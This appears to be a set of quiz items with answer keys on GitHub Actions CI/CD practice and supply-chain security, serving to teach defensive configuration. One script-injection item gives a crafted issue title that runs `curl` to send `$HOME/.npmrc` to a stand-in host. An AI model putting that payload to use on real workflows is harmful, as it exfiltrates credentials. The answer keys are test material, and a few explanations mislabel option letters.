scenario: A team's CI workflow runs `npm install` on every PR. With 30 PRs per day, the job takes 4 minutes each time. A DevOps engineer wants to reduce this to under 30 seconds.
question: What is the correct caching strategy to achieve this?
options: Cache the entire node_modules/ directory using the branch name as the cache key
Cache the npm global cache directory (~/.npm) using a key that hashes the package-lock.json file
Cache node_modules/ using the workflow run ID as the key
Use actions/setup-node with node-version as the cache key
explanation: Caching ~/.npm (the npm global cache) with a key based on a hash of package-lock.json is the correct approach. When dependencies don't change, the cache restores in ~5 seconds instead of downloading. The key MUST include a hash of the lock file — if you cache by branch name (A) or run ID (C), the cache either never invalidates (serving stale packages) or never hits (new key every run). Caching node_modules/ directly (A) is fragile across OS environments. actions/setup-node with node-version (D) doesn't cache package content.

scenario: A workflow uses `uses: third-party-org/dangerous-action@v2`. A supply chain attack modifies the `v2` tag to point to malicious code. The next time any PR triggers the workflow, the malicious action runs with access to all repository secrets.
question: What is the CORRECT way to reference third-party actions to prevent this attack vector?
options: Pin to the full commit SHA of the action: `third-party-org/dangerous-action@abc1234...` with the tag as a comment
Use @latest instead of @v2 to always get the newest, most secure version
Only use actions from verified publishers
Copy the action's source code into your repository and reference it locally
explanation: B Git tag like @v2 can be moved to point at different (malicious) code; a full-length commit SHA cannot be reassigned. The documented pattern is `uses: actions/checkout@<full-sha> # v4.2.2`, the SHA as the reference and the version as a comment for readability, after verifying the SHA comes from the action's own repository, not a fork. Organizations can also enforce SHA pinning through the allowed-actions policy. @latest (B) makes things worse because any change takes effect immediately. A verified creator (C) is a trust signal but doesn't stop a tag being moved. Vendoring the source (D) works but leaves you maintaining a copy without update tooling.

scenario: A public repository's workflows all start with `permissions: write-all`. A contributor argues this is harmless because 'fork pull requests can't use the token anyway'. A security auditor still rates it a Critical finding.
question: Which statement best explains why the auditor is right?
options: Fork PRs under the `pull_request` event receive the full write-all token, so any contributor can push to main
A write-all token persists after the run ends and grants permanent admin access to the repository
Any compromised action or injected script in a trusted run (push, `pull_request_target`, `workflow_run`) inherits a token that can rewrite code, releases and tags
write-all lets the workflow write to every other repository in the organization
explanation: C is correct: for `pull_request` events from forks GitHub already downgrades write permissions to read-only, so the contributor is right about that case, but every trusted run (pushes, `pull_request_target`, `workflow_run`, schedules) gets the full write-all token. One compromised third-party action or script-injection bug in any of those runs can then push code, alter releases or move tags. A is wrong because fork PRs under `pull_request` get a read-only token. B is wrong because the GITHUB_TOKEN expires when the job finishes. D is wrong because the token's permissions are limited to the repository that contains the workflow.

scenario: A repository has no .github/dependabot.yml file. The team discovers their production service is running with a dependency that has a critical CVE published 8 months ago. The dependency is still at the vulnerable version because no one knew it needed updating.
question: What does a correctly configured dependabot.yml provide that manual dependency management cannot reliably provide?
options: Automatic merging of all dependency updates without human review
Enforcing semantic versioning across all dependencies
Blocking deployments when vulnerable dependencies are detected in production
Continuous monitoring of all configured package ecosystems and automatic PR creation when vulnerabilities are detected or new versions are available
explanation: Dependabot monitors configured ecosystems (npm, pip, docker, github-actions, etc.) continuously. When a vulnerability is found or a new version is published, it opens a PR automatically — bringing the update to the team's attention without anyone having to manually check. It does NOT auto-merge by default (A) — the team reviews and merges. It doesn't block production deployments (C) or enforce versioning standards (B).

scenario: A team has 5 repositories, each with their own copy of a 200-line 'test and deploy' workflow. When a security vulnerability is found in the shared deployment step, all 5 files need to be updated separately. Two repositories get updated, three are missed, and the vulnerability persists.
question: What GitHub Actions pattern eliminates this maintenance and security problem?
options: Create a reusable workflow (on: workflow_call) in a shared repository and call it from each consumer repository
Copy the workflow into a shared Gist and reference it with curl in each workflow
Use GitHub Actions Environments to share configuration across repositories
Create an organization-level workflow template that each repository copies on setup
explanation: Reusable workflows (triggered by workflow_call) allow you to define a workflow once and call it from any repository: `uses: your-org/shared-workflows/.github/workflows/deploy.yml@main`. When you fix the vulnerability in the shared workflow, all calling repositories automatically get the fix on their next run. Templates (D) solve the initial creation problem but still result in copies — fixing one doesn't fix others. Environments (C) share secrets/vars, not workflow logic. Gist references (B) have no versioning, access control, or security guarantees.

scenario: A team deploys to AWS from GitHub Actions by storing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as repository secrets. A security review recommends eliminating these long-lived credentials entirely.
question: What is the modern, recommended approach for authenticating GitHub Actions to AWS without storing long-lived credentials?
options: Use shorter-expiry AWS credentials and rotate them every 30 days
Store credentials in GitHub Environments instead of repository secrets
Configure OpenID Connect (OIDC) federation between GitHub Actions and AWS IAM, allowing the workflow to exchange a short-lived GitHub token for temporary AWS credentials
Use a self-hosted runner inside the AWS network with an attached IAM role
explanation: OIDC federation is the gold standard for cloud authentication from CI/CD. The workflow requests a short-lived JWT from GitHub's OIDC provider, presents it to AWS STS, and receives temporary credentials scoped to the specific IAM role. There are no secrets to store, rotate, or accidentally leak. The credentials expire when the workflow run ends. Short-rotation (A) reduces exposure window but still has secrets. Environment secrets (B) improve scoping but still use long-lived keys. Self-hosted runners with IAM roles (D) work but add infrastructure complexity.

scenario: A workflow deploys to production automatically on every push to main. A bad deployment goes out on Friday at 5pm. The on-call engineer needs to stop further deployments immediately without disabling the entire workflow.
question: What GitHub-native mechanism allows production deployments to require human approval before proceeding?
options: Add an if: condition to the deploy job checking for a repository variable
Add a manual approval step using a separate workflow with workflow_dispatch trigger
Configure an environment with required reviewers in GitHub Settings → Environments, and reference that environment in the deploy job
Configure branch protection to require deployment status checks before merging
explanation: GitHub Environments support required reviewers — one or more specified users must approve before a job referencing that environment can run. When the deploy job declares `environment: production`, GitHub pauses execution and sends approval requests to the configured reviewers. This is the native gate for deployment approval. The if: condition (A) can be bypassed by modifying the variable. A separate workflow_dispatch (B) requires extra steps and doesn't integrate with the main pipeline. Branch protection deployment checks (D) apply to merging, not to the deployment itself.

scenario: A CodeQL scan is configured as a workflow, but the team notices that PRs with new SQL injection vulnerabilities are still being merged. Investigation reveals the CodeQL workflow runs but its result is not blocking merges.
question: What additional configuration is required to make CodeQL scan results block PR merges?
options: Increase the CodeQL scan severity threshold to 'critical'
Add the CodeQL workflow check name as a required status check in the branch protection settings for main
Configure CodeQL to run in blocking mode using the block: true parameter
Enable GitHub Advanced Security on the repository
explanation: Running a workflow and blocking a merge are two separate configurations. The CodeQL workflow produces check results, but the branch must be configured to require them: either add the check as a required status check in branch protection, or use a ruleset with the 'Require code scanning results' rule, which blocks merges on alerts at the severities you choose. There is no `block: true` parameter in CodeQL (C). A severity threshold (A) without a required gate still doesn't block anything. Licensing GitHub Code Security / Advanced Security (D) unlocks code scanning on private repositories but doesn't make it a merge gate on its own.

scenario: A team's CI workflow has three sequential jobs: build → test → deploy-staging. Each job takes 5 minutes. Total pipeline time is 15 minutes. Analysis shows that 'lint' and 'security-scan' could run independently of 'test' since they don't share outputs.
question: What GitHub Actions configuration reduces pipeline time by running independent jobs in parallel?
options: Set `runs-on: ubuntu-latest` for all jobs to use the same runner pool
Split the workflow file into separate files — one per job
Use a matrix strategy with all job names to run them simultaneously
Remove the `needs:` declarations from lint and security-scan so they run without waiting for dependencies
explanation: Jobs without `needs:` dependencies run in parallel automatically on GitHub Actions. Removing `needs: [build]` from lint and security-scan allows them to start immediately when the workflow triggers, instead of waiting for build to complete. The runner pool (A) affects resource allocation, not job scheduling. Matrix strategy (C) is for running the same job with multiple configurations, not different jobs in parallel. Separate workflow files (B) create separate workflow runs, not parallelism within one pipeline.

scenario: A team wants to add a status badge to their README showing the current state of their main branch CI workflow. The badge should turn red when the build breaks and green when it passes.
question: What is the correct URL pattern for a GitHub Actions workflow status badge?
options: https://github.com/{owner}/{repo}/actions/workflows/{workflow-file}.yml/badge.svg
https://shields.io/github/workflow/status/{owner}/{repo}/{workflow-name}
https://github.com/{owner}/{repo}/workflows/{workflow-name}/badge.svg?branch=main
https://api.github.com/repos/{owner}/{repo}/actions/runs/latest/badge
explanation: GitHub's native badge URL format is: `https://github.com/{owner}/{repo}/actions/workflows/{workflow-filename}.yml/badge.svg`. This renders a badge showing the last run status for that workflow file. You can append `?branch=main` to show the status specifically for the main branch. Shields.io (B) is a third-party service — functional but an external dependency. The `/workflows/` path format (C) is outdated and uses workflow name, not file. The API endpoint (D) doesn't return a badge image.

scenario: A public repository has a workflow triggered by `pull_request_target` that checks out the PR's code using `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` and runs it in a context with access to repository secrets.
question: Why is this `pull_request_target` + checkout pattern a critical security vulnerability?
options: pull_request_target workflows cannot access secrets — they run in a read-only context
The vulnerability is that actions/checkout must use the default ref, not a PR SHA

pull_request_target runs with the base branch's permissions and secrets. Checking out and executing untrusted PR code gives external contributors full access to repository secrets — a supply-chain attack vector
pull_request_target is deprecated and should not be used
explanation: pull_request_target runs in the context of the base repository (not the fork) and has access to secrets — by design, for legitimate use cases like posting comments. The vulnerability arises when you also check out and execute the untrusted PR's code. An attacker can submit a PR that modifies workflow scripts or test files, which then run with full secret access. The safe pattern: use pull_request (no secret access for fork PRs) for code execution, and pull_request_target only for safe operations that don't run untrusted code (e.g., labeling, commenting).

scenario: A team's deploy workflow runs on every push to main. When 3 developers merge PRs within 2 minutes, 3 deploy jobs queue up simultaneously. Each deploy takes 8 minutes. The last deploy wins and overwrites the previous ones, but 2 deploys run wastefully.
question: What GitHub Actions configuration cancels in-progress deploys when a newer one starts?
options: Set `max-parallel: 1` in the job matrix strategy
Add a `timeout-minutes: 1` to the deploy job so old deploys expire
Use an environment with required reviewers to manually queue deploys
Add a `concurrency` group to the workflow with `cancel-in-progress: true` — when a new run starts for the same group, the in-progress run is cancelled
explanation: Concurrency groups define a named slot. Only one workflow run with the same group key can run at a time. With `cancel-in-progress: true`, starting a new run in the group cancels the currently running one immediately. This prevents deploy pile-ups while ensuring only the latest code reaches production. `max-parallel` (A) applies to matrix jobs, not workflow runs. Required reviewers (C) add human gates, not cancellation. Short timeouts (B) kill any deploy in progress regardless of whether a newer one is waiting.

scenario: A team has 10 workflows that each define the same 15-step 'build and push Docker image' sequence inline. When the Docker registry URL changes, all 10 files need updating. The team wants to extract this into a reusable unit that can also accept inputs like image-name and tag.
question: What is the CORRECT GitHub Actions mechanism for a reusable, parameterized multi-step sequence used within a single workflow (not calling another full workflow file)?
options: A composite action — defined in action.yml with `runs.using: composite`, accepting inputs and containing multiple steps, reusable across workflows and repositories
A reusable workflow (on: workflow_call) stored in a shared repository
A workflow template stored in .github/workflow-templates/
An environment configuration with a shared step script
explanation: Composite actions package multiple steps into a single `uses:` reference with typed inputs. They live in a repository's action.yml and are called like any other action: `uses: org/repo/path@version`. Unlike reusable workflows, composite actions run inline within the calling job (same runner, same environment) — making them ideal for step-level reuse. Reusable workflows (B) run as separate jobs and are better for full pipeline reuse. Workflow templates (C) are starter files — copying, not sharing. Environment configs (D) share variables, not step logic.

scenario: A team switches to self-hosted runners for cost savings. A security auditor notes that the self-hosted runner is shared across all repositories in the organization and runs jobs from public forks of the organization's open-source repositories.
question: What is the PRIMARY security risk of this configuration?
options: Self-hosted runners have lower performance than GitHub-hosted runners
Self-hosted runners cannot use organization-level secrets

A malicious PR from a public fork can execute arbitrary code on the self-hosted runner, potentially accessing other repositories' secrets, cached credentials, and internal network resources the runner has access to
Self-hosted runners are not allowed on public repositories by GitHub policy
explanation: Self-hosted runners can persist between jobs (unlike GitHub-hosted runners, which are fresh VMs per job) and often sit inside internal networks with cached credentials. A malicious fork PR that runs on such a runner can exfiltrate credentials, poison caches or pivot to internal systems. GitHub's guidance is that self-hosted runners should almost never be used for public repositories; where they are needed, use ephemeral just-in-time runners and isolate them with runner groups. Performance (A) is not a security risk. Self-hosted runners can use organization secrets (B), and GitHub does not forbid them on public repositories (D); it strongly advises against it.

scenario: A team's test suite must pass on Ubuntu 22.04, Windows Server 2022, and macOS 14 with Node.js 18 and Node.js 20. That's 6 combinations. They currently have 6 separate workflow jobs, each copy-pasted with different runner and Node version values.
question: What GitHub Actions feature eliminates the duplication by running all 6 combinations automatically?
options: Create 6 separate workflow files, one per combination
Use environment variables to switch behavior within a single parameterized job
Use workflow_call to pass parameters to 6 separate called workflows
Use a matrix strategy: define `os` and `node-version` as matrix dimensions; GitHub generates one job per combination automatically
explanation: Matrix strategy is the purpose-built feature for combinatorial test jobs. Defining `matrix: { os: [ubuntu-22.04, windows-2022, macos-14], node-version: [18, 20] }` generates 6 jobs automatically — one per combination. Each job uses `${{ matrix.os }}` and `${{ matrix.node-version }}` as its runner and setup parameter. Failed combinations are individually identifiable. Adding a new OS or Node version requires changing only the matrix definition. Separate files (A) and workflow_call (C) don't reduce duplication. Environment variable switching (B) produces one job result, hiding which combination failed.

scenario: A workflow step needs to use a database connection string that varies by environment (dev/staging/prod). The connection string for dev is non-sensitive but the production connection string contains credentials. A developer suggests storing all of them as workflow environment variables in the YAML file.
question: What is the CORRECT way to handle environment-specific configuration where some values are sensitive?
options: Store non-sensitive configuration as GitHub Variables (vars context) and sensitive values as GitHub Secrets (secrets context); reference environment-specific secrets via GitHub Environments
Store all values as environment variables in the workflow YAML — they are not committed to a branch
Encrypt all values with gpg before storing them in the workflow YAML
Use a single secret per environment and concatenate all config values into it
explanation: GitHub distinguishes between Variables (plaintext, visible in logs, accessible via `${{ vars.NAME }}`) and Secrets (masked in logs, only accessible via `${{ secrets.NAME }}`). Non-sensitive config (DB host, port, feature flags) belongs in Variables. Credentials belong in Secrets. GitHub Environments let you define environment-specific sets of variables and secrets, so the same workflow reference `${{ secrets.DB_PASSWORD }}` resolves to different values per environment. Workflow YAML is committed to the repository (B) — production credentials in YAML are a critical exposure. Custom encryption (C) requires key management overhead.

scenario: A build workflow produces a 500MB binary artifact. The artifact is used by a downstream integration test job in the same workflow. After 90 days, old build artifacts are consuming significant GitHub storage. The team wants to reduce storage cost while keeping artifacts accessible for 30 days.
question: What is the CORRECT configuration for artifact retention in this scenario?
options: Upload the artifact with `actions/upload-artifact` and set `retention-days: 30`
Store the artifact in a GitHub Release asset, which has no retention limit
Use GitHub Packages to store the binary with a 30-day expiry policy
Delete the artifact at the end of the workflow using the GitHub API
explanation: `actions/upload-artifact` supports a `retention-days` parameter. Setting `retention-days: 30` automatically deletes the artifact after 30 days, reducing storage costs while keeping it available for the common use cases (debugging, audit). GitHub Releases (B) are for user-facing release assets — storing internal build artifacts there pollutes the release page and has no TTL. GitHub Packages (C) doesn't have a built-in TTL for all package types. Manual deletion via API (D) requires additional workflow steps and won't clean up artifacts from failed runs.

scenario: A team wants a workflow that can be triggered manually from the GitHub UI for emergency deployments. The operator must specify a target environment ('staging' or 'production') and an image tag to deploy. The workflow should validate that only 'staging' or 'production' are accepted.
question: What trigger and input configuration supports this manual workflow with validated inputs?
options: on: push with environment variables set in the workflow
on: repository_dispatch triggered via the GitHub API with a JSON payload
on: workflow_dispatch with `inputs` defining `environment` as a `choice` type with options ['staging', 'production'] and `image-tag` as a string input
on: schedule with a cron that checks a configuration file
explanation: workflow_dispatch enables manual triggering from the GitHub UI (or API). The `inputs` block defines form fields: `choice` type provides a dropdown with predefined valid values (preventing arbitrary environment names), `string` type accepts free-form text. The operator sees a form in the GitHub Actions UI, selects the environment and types the image tag, then runs the workflow. repository_dispatch (B) is API-only, not UI-triggered. schedule (D) is time-based, not manual. push (A) can't define inputs.

scenario: An organization stores a shared database migration credentials as an organization secret. One repository team overrides it with a repository-level secret of the same name pointing to their test database. A specific deployment environment should use production credentials.
question: What is the correct GitHub secrets precedence hierarchy?
options: Organization secrets always win — repository and environment secrets are overridden
The most recently created secret wins regardless of scope
Repository secrets always win — they override organization secrets for that repository
Environment secrets > Repository secrets > Organization secrets; a more specific scope always takes precedence
explanation: GitHub secrets follow scope precedence: Environment secrets override Repository secrets, which override Organization secrets. For a job referencing a specific environment, if an environment-level secret with the name exists, it's used. If not, the repository-level secret is checked. If not found there, the organization-level secret is used. This hierarchy allows organization-wide defaults to be overridden at progressively more specific scopes — exactly the pattern for shared credentials overridden per repository or per deployment environment.

scenario: Dependabot opens 15 PRs per week for minor and patch version bumps of npm dependencies. All have green CI and no breaking changes. The security team approves auto-merging for patch updates but requires human review for minor and major updates.
question: What configuration correctly implements this auto-merge policy for Dependabot?
options: Add a `pull_request` workflow, guarded to Dependabot's PRs, that reads `update-type` from `dependabot/fetch-metadata` and runs `gh pr merge --auto` only for `version-update:semver-patch`
Enable auto-merge globally for all Dependabot PRs
In dependabot.yml, set `open-pull-requests-limit: 0` for minor and major updates
Create a Dependabot secret that enables auto-merge for patch updates
explanation: GitHub's documented pattern is a workflow on `pull_request` with `if: github.event.pull_request.user.login == 'dependabot[bot]'` that uses `dependabot/fetch-metadata` to read `steps.metadata.outputs.update-type`. For `version-update:semver-patch` it runs `gh pr merge --auto`, so the PR merges once required checks pass; minor and major updates are left for humans. Global auto-merge (B) ignores the minor/major rule. A limit of 0 (C) stops those PRs being opened at all, which is not the same as requiring review. Dependabot secrets (D) hold credentials for Dependabot-triggered runs; they don't configure merge behaviour.

scenario: A workflow has 3 jobs: `build`, `test`, and `deploy`. The deploy job needs to create a GitHub Release (write:contents) and push a Docker image using OIDC. The build and test jobs only need to read repository contents.
question: What is the MOST secure permissions configuration for this workflow?
options: Set `permissions: write-all` at the workflow level for simplicity
Set `permissions: { contents: write, id-token: write }` at the workflow level — unused permissions don't cause harm
Set `permissions: read-all` at the workflow level as a default, then override in the deploy job with `permissions: { contents: write, id-token: write }` — each job gets only what it needs
Omit permissions entirely — GitHub uses sensible defaults
explanation: Job-level permission overrides are the correct least-privilege pattern. Setting `permissions: read-all` at the workflow level constrains all jobs by default, then granting elevated permissions only to the deploy job limits the blast radius if any job is compromised (e.g., via a malicious action). `write-all` (A) grants maximum permissions to every job unnecessarily. Workflow-level write permissions (B) propagate to all jobs including build/test. Omitting permissions (D) defaults to the repository's base token permissions, which may be too permissive or too restrictive unpredictably.

scenario: A workflow has a `build` job that produces a Docker image tag (e.g., `sha-abc1234`). A downstream `deploy` job needs to reference this exact tag. The tag value is computed dynamically during the build job and is not known at workflow authoring time.
question: What is the correct mechanism for passing a value from one job to a dependent job in GitHub Actions?
options: Write the value to a shared file in the workspace; the deploy job reads the file
Pass the value as an environment variable with `env:` at the workflow level
Use a repository variable — the build job writes to it via API and the deploy job reads it
Define an `outputs` block on the build job, set the output using `$GITHUB_OUTPUT`, then reference it in the deploy job via `needs.build.outputs.image-tag`
explanation: Job outputs are the designed mechanism for inter-job data passing. The build job writes `echo 'image-tag=sha-abc1234' >> $GITHUB_OUTPUT`, declares it in `outputs: { image-tag: ${{ steps.tag.outputs.image-tag }} }`, and the deploy job (with `needs: build`) references `${{ needs.build.outputs.image-tag }}`. Shared files (A) don't work across jobs because each job runs on a fresh runner. Repository variables (C) have write/read latency and create state outside the workflow. Workflow-level env (B) is set before the run — dynamic values computed during execution aren't available.

scenario: A build job occasionally hangs when a test fixture fails to clean up a running process. The job then occupies a runner until the default job timeout of 360 minutes is reached. The team wants hung jobs terminated after 30 minutes.
question: What GitHub Actions configuration enforces a maximum runtime for a workflow or job?
options: Set `timeout-minutes: 30` on the job (or on the long-running step) so GitHub cancels it when the limit is exceeded
Configure the runner to reboot after 30 minutes using a system cron job
Use the GitHub API to monitor workflow run duration and cancel via webhook
Set an environment variable `MAX_RUNTIME=30` and check it in each step
explanation: `timeout-minutes` is a built-in key at job level (`jobs.<job_id>.timeout-minutes`, default 360) and at step level (`jobs.<job_id>.steps[*].timeout-minutes`); GitHub cancels the job or kills the step when it is exceeded. There is no workflow-level timeout key, so you set it on each job. Runner reboots (B) would interrupt every job on that runner. API monitoring (C) adds external infrastructure for something the platform does natively. An environment variable (D) only works if every step checks it, and a hung process won't.

scenario: A workflow has `build`, `test` and `deploy` jobs and triggers on `push` to any branch. The team wants `build` and `test` to keep running on every branch, but `deploy` must run only for pushes to `main`.
question: What is the CORRECT way to restrict only the deploy job to pushes to main?
options: Change the trigger to `on: push: branches: [main]`
Move deploy into a separate workflow triggered by `workflow_dispatch`
Add `if: github.ref == 'refs/heads/main'` to the deploy job
Add a first step to deploy that checks the branch name and runs `exit 0` if it isn't main
explanation: C is correct: a job-level `if:` condition on `github.ref` skips the deploy job on other branches while build and test still run everywhere. A is wrong because a trigger filter applies to the whole workflow, so build and test would stop running on feature branches. B is wrong because a manual trigger removes the automatic deploy on main, which the team still wants. D is wrong because the job still starts and consumes a runner, and it reports as successful rather than skipped, which hides what happened.

scenario: A team uses `actions/cache` in their workflow. A developer on a feature branch notices that the cache from main is being read but their feature branch cannot write a new cache entry that would be accessible from main.
question: What is the correct understanding of GitHub Actions cache scope and branch isolation?
options: Cache is global per repository — all branches read and write to the same cache pool
Cache is scoped to the runner OS — ubuntu caches are not accessible from windows runners
Cache is isolated per workflow run — no sharing between runs or branches

Cache scope is branch-first: a branch can read from its own cache, then fall back to the base branch cache, then the default branch. Only the default branch and the base branch write caches visible to PRs from child branches
explanation: GitHub Actions cache has a branch-scoped hierarchy. When a PR branch looks for a cache hit, it checks: 1) its own branch cache, 2) the base branch cache, 3) the default branch cache. This allows feature branches to benefit from main's warm cache (the common case for package caches). However, caches created on a feature branch are NOT accessible from main or other branches — preventing cross-branch cache poisoning. Runner OS isolation (B) is also true but is a separate concern from branch scoping.

scenario: An issue-triage workflow contains the step `run: echo "Triaging: ${{ github.event.issue.title }}"`. A tester opens an issue titled `x"; curl -d @$HOME/.npmrc https://evil.example; echo "` and the runner makes an outbound request.
question: What is GitHub's recommended fix for this step?
options: Pass the title through an environment variable (`env: TITLE: ${{ github.event.issue.title }}`) and use `"$TITLE"` in the script
Wrap the expression in single quotes so the shell treats it as a literal
Set `permissions: read-all` so the injected command can't do any damage
Mask the title with `::add-mask::` before echoing it
explanation: A is correct: `${{ }}` expressions are expanded into the script text before the shell runs, so attacker-controlled input becomes code. GitHub's preferred mitigation is to assign the value to an intermediate environment variable and reference it as a quoted shell variable, so it is treated as data. B is wrong because the attacker can include a single quote in the title to break out of the quoting. C is wrong because least privilege limits the token's blast radius but the arbitrary command still runs on the runner. D is wrong because masking only hides values in logs; it doesn't stop execution.

scenario: A team moved its AWS deploys to OIDC. The IAM role's trust policy trusts `token.actions.githubusercontent.com` and checks only `aud = sts.amazonaws.com`. The deploy job uses `environment: production` and `permissions: id-token: write`.
question: What is the most important change to the trust policy?
options: Add a `sub` condition such as `repo:my-org/my-repo:environment:production`
Change the workflow permission to `id-token: read` so tokens can't be written
Store the role ARN as an environment secret instead of in the workflow
Reduce the maximum session duration of the role to 15 minutes
explanation: A is correct: with only an audience check, any workflow that can obtain a GitHub OIDC token with that audience, in any repository, could assume the role. GitHub's guidance is to define conditions, typically on `sub` together with `aud`, so only the intended repository and context can get credentials. For a job that references an environment, the subject is `repo:ORG/REPO:environment:NAME`. B is wrong because `id-token: write` is the permission needed to request the token; it grants no write access to repository resources. C is wrong because a role ARN is an identifier, not the credential. D is wrong because shorter sessions don't stop untrusted repositories from assuming the role.

scenario: An organization has 400 repositories. Security wants any workflow that references an action by tag or branch instead of a full commit SHA to fail, without editing each repository.
question: Which control does this?
options: Add a `github-actions` entry to every repository's dependabot.yml
Make the security team code owners of `.github/workflows/` in every repository
Enable SHA pinning enforcement in the organization's allowed-actions policy
Create a push ruleset that blocks changes to `.yml` files
explanation: C is correct: the allowed-actions policy can require actions to be pinned to a full-length commit SHA, and workflows that use an unpinned action then fail. Set at organization level, it covers every repository at once. A is wrong because Dependabot keeps action versions up to date (and can update SHA pins) but doesn't block tag references, and it still needs a file in each repo. B is wrong because code owner review relies on humans noticing unpinned references and needs a CODEOWNERS entry in each repo. D is wrong because blocking all `.yml` changes would stop all legitimate workflow edits too.
